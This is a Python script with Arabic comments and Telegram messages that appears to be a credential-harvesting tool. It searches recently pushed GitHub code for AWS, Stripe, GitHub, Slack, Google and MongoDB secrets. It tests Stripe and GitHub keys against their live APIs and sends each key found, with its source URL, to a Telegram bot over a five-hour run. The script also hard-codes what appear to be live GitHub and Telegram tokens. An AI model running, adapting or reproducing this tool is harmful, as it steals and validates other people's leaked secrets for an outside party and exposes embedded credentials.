#import sys
#import re
#import time
#import random
#import requests
#from datetime import datetime, timedelta

# =================================================================
# التوكنات المضمنة
# =================================================================
PAT_TOKEN = "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"
TELEGRAM_TOKEN = "8914882875:AAGmoUu_Ckl16HA0wrcM6YICNz1ZH_WphCQ"
TELEGRAM_CHAT_ID = "6306556778"
# =================================================================

# مدة التشغيل الكلية (5 ساعات)
TOTAL_RUN_DURATION = 5 * 60 * 60  # 18000 ثانية

# أنماط البحث
PATTERNS = {
    'aws': r'(AKIA|ASIA)[A-Z0-9]{16}',
    'stripe_live': r'sk_live_[A-Za-z0-9]{24}',
    'github_token': r'ghp_[A-Za-z0-9]{36}',
    'slack_token': r'xox[baprs]-[A-Za-z0-9]{10,48}',
    'google_api': r'AIza[0-9A-Za-z-_]{35}',
    'mongodb_uri': r'mongodb\+srv://[^:]+:[^@]+@[^/]+',
}

# ------------------- دوال التحقق -------------------
def validate_aws(key):
    try:
        if len(key) >= 16 and key.startswith(('AKIA', 'ASIA')):
            return True
        return False
    except:
        return False

def validate_stripe(key):
    try:
        resp = requests.get(
            'https://api.stripe.com/v1/balance',
            headers={'Authorization': f'Bearer {key}'},
            timeout=10
        )
        return resp.status_code == 200
    except:
        return False

def validate_github(key):
    try:
        resp = requests.get(
            'https://api.github.com/user',
            headers={'Authorization': f'token {key}'},
            timeout=10
        )
        return resp.status_code == 200
    except:
        return False

def validate_generic(key):
    return True

VALIDATORS = {
    'aws': validate_aws,
    'stripe_live': validate_stripe,
    'github_token': validate_github,
}

# ------------------- البحث في GitHub -------------------
def search_github(query, token):
    headers = {
        'Authorization': f'token {token}',
        'Accept': 'application/vnd.github.v3+json'
    }
    time_filter = (datetime.utcnow() - timedelta(hours=6)).isoformat() + 'Z'
    url = f"https://api.github.com/search/code?q={query}+pushed:>{time_filter}&per_page=30"
    try:
        resp = requests.get(url, headers=headers, timeout=20)
        if resp.status_code == 200:
            return resp.json().get('items', [])
        else:
            return []
    except Exception as e:
        print(f"Network Error: {e}")
        return []

# ------------------- الإرسال إلى تليجرام -------------------
def send_to_telegram(bot_token, chat_id, text, parse_mode='Markdown'):
    try:
        url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
        payload = {
            'chat_id': chat_id,
            'text': text,
            'parse_mode': parse_mode
        }
        requests.post(url, json=payload, timeout=10)
        return True
    except Exception as e:
        print(f"Telegram Error: {e}")
        return False

# ===================== رسائل التليجرام بالتنسيق المطلوب =====================

def send_startup_msg(bot_token, chat_id):
    msg = (
        f"🔥 *بدء نظام الصيد لمدة 5 ساعات* 🔥\n"
        f"✅ سيتم إرسال كل مفتاح فوراً.\n"
        f"✅ سيتم إرسال تقرير مفصل كل 5 دقائق.\n"
        f"----------------\n"
        f"عدد المفاتيح الصالحة التي كشفها: 0\n"
        f"عدد المفاتيح غير الصالحة التي كشفها: 0\n"
        f"----------------\n"
        f"*المفاتيح الصالحة مع وقت كل مفتاح:*\n"
        f"(لا توجد مفاتيح صالحة بعد)\n"
        f"----------------\n"
        f"*المفاتيح غير الصالحة مع وقت كل مفتاح:*\n"
        f"(لا توجد مفاتيح غير صالحة بعد)\n"
        f"----------------\n"
        f"🕒 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
    )
    send_to_telegram(bot_token, chat_id, msg)

def send_key(bot_token, chat_id, key_type, key_value, raw_url, is_valid, detection_time):
    """إرسال المفتاح فوراً (رسالة منفصلة لكل مفتاح)"""
    status = "✅ صالح" if is_valid else "❌ غير صالح"
    msg = (
        f"{status} *{key_type.upper()}*\n"
        f"`{key_value}`\n"
        f"📁 {raw_url}\n"
        f"🕒 الاكتشاف: {detection_time}"
    )
    send_to_telegram(bot_token, chat_id, msg)

def send_periodic_report(bot_token, chat_id, valid_list, invalid_list, elapsed_min, total_min):
    """تقرير دوري كل 5 دقائق بالتنسيق المطلوب"""
    valid_count = len(valid_list)
    invalid_count = len(invalid_list)
    
    # بناء قائمة المفاتيح الصالحة
    valid_text = ""
    if valid_list:
        for k in valid_list:
            valid_text += f"🔑 {k['type']}: `{k['key']}` (وقت: {k['time']})\n"
    else:
        valid_text = "(لا توجد مفاتيح صالحة جديدة)"
    
    # بناء قائمة المفاتيح غير الصالحة
    invalid_text = ""
    if invalid_list:
        for k in invalid_list:
            invalid_text += f"🔒 {k['type']}: `{k['key']}` (وقت: {k['time']})\n"
    else:
        invalid_text = "(لا توجد مفاتيح غير صالحة جديدة)"
    
    msg = (
        f"📊 *تقرير دوري (آخر 5 دقائق)*\n"
        f"----------------\n"
        f"عدد المفاتيح الصالحة التي كشفها: {valid_count}\n"
        f"عدد المفاتيح غير الصالحة التي كشفها: {invalid_count}\n"
        f"----------------\n"
        f"*المفاتيح الصالحة مع وقت كل مفتاح:*\n"
        f"{valid_text}\n"
        f"----------------\n"
        f"*المفاتيح غير الصالحة مع وقت كل مفتاح:*\n"
        f"{invalid_text}\n"
        f"----------------\n"
        f"🕒 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
    )
    send_to_telegram(bot_token, chat_id, msg)

def send_shutdown_msg(bot_token, chat_id, total_valid, total_invalid):
    msg = (
        f"🛑 *تم إيقاف النظام بعد 5 ساعات* 🛑\n"
        f"----------------\n"
        f"عدد المفاتيح الصالحة التي كشفها: {total_valid}\n"
        f"عدد المفاتيح غير الصالحة التي كشفها: {total_invalid}\n"
        f"----------------\n"
        f"🕒 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
    )
    send_to_telegram(bot_token, chat_id, msg)

# ------------------- دورة البحث -------------------
def search_cycle(token, bot_token, chat_id, global_valid, global_invalid, recent_valid, recent_invalid):
    """تنفذ دورة بحث واحدة، وترسل كل مفتاح فوراً، وتضيفه إلى القوائم"""
    for name, pattern in PATTERNS.items():
        results = search_github(f'"{pattern}"', token)
        print(f"[*] فحص {name}: {len(results)} ملف")
        for item in results:
            raw_url = item.get('html_url', '').replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
            if not raw_url:
                continue
            try:
                resp = requests.get(raw_url, timeout=15)
                if resp.status_code != 200:
                    continue
                matches = re.findall(pattern, resp.text)
                detection_time = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
                for m in set(matches):
                    valid = True
                    if name in VALIDATORS:
                        valid = VALIDATORS[name](m)
                    
                    key_info = {'type': name, 'key': m, 'time': detection_time, 'url': raw_url}
                    
                    if valid:
                        global_valid.append(key_info)
                        recent_valid.append(key_info)
                    else:
                        global_invalid.append(key_info)
                        recent_invalid.append(key_info)
                    
                    # إرسال فوري
                    send_key(bot_token, chat_id, name, m, raw_url, valid, detection_time)
                    time.sleep(random.uniform(1.0, 2.5))
            except Exception as e:
                print(f"[-] خطأ: {e}")
            time.sleep(random.uniform(0.3, 0.8))

# ------------------- التشغيل الرئيسي -------------------
def main():
    token = PAT_TOKEN
    bot_token = TELEGRAM_TOKEN
    chat_id = TELEGRAM_CHAT_ID

    if not token or not bot_token or not chat_id:
        print("ERROR: تأكد من التوكنات")
        sys.exit(1)

    start_time = time.time()
    end_time = start_time + TOTAL_RUN_DURATION

    # قوائم عامة
    global_valid = []
    global_invalid = []
    
    # قوائم مؤقتة لآخر 5 دقائق
    recent_valid = []
    recent_invalid = []

    # رسالة البدء (بالتنسيق المطلوب)
    send_startup_msg(bot_token, chat_id)
    print("[+] تم إرسال رسالة البدء.")

    cycle_count = 0
    last_report_time = time.time()

    # الحلقة الرئيسية
    while time.time() < end_time:
        try:
            print(f"[*] بدء الدورة رقم {cycle_count + 1}")
            search_cycle(token, bot_token, chat_id, global_valid, global_invalid, recent_valid, recent_invalid)
            cycle_count += 1

            # انتظار 5 دقائق مع مراقبة وقت التقرير
            wait_time = 300
            wait_start = time.time()
            while time.time() - wait_start < wait_time and time.time() < end_time:
                time.sleep(5)
                if time.time() - last_report_time >= 300:
                    elapsed_min = int((time.time() - start_time) / 60)
                    total_min = int(TOTAL_RUN_DURATION / 60)
                    send_periodic_report(bot_token, chat_id, recent_valid, recent_invalid, elapsed_min, total_min)
                    recent_valid.clear()
                    recent_invalid.clear()
                    last_report_time = time.time()

        except Exception as e:
            error_msg = f"⚠️ *خطأ غير متوقع*: {str(e)[:100]}\nسيتم إعادة المحاولة..."
            send_to_telegram(bot_token, chat_id, error_msg)
            time.sleep(60)

    # رسالة الإغلاق (بالتنسيق المطلوب)
    send_shutdown_msg(bot_token, chat_id, len(global_valid), len(global_invalid))
    print("[+] تم الإنهاء.")

if __name__ == "__main__":
    main()
